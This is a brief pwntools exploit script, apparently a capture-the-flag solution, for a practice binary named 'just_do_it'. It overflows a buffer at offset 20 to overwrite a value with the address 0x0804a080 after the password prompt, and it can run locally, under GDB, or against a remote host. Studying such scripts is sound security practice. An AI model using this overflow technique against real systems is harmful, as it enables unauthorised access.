from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
# init-pwndbg
# b *0x4006a8
b *main+316
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './just_do_it'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-l", "80%", "-t", ":.1"]

io = start()
# io.sendline(b"A"*30)
# io.sendafter("password.\n", flat({20:0x0804a080}))

io.recvuntil(b"password.\n")
#Create the payload
# payload = b"\x00"*20 + p32(0x0804a080)

#Send the payload
io.sendline(flat({20:0x0804a080}))
io.interactive()
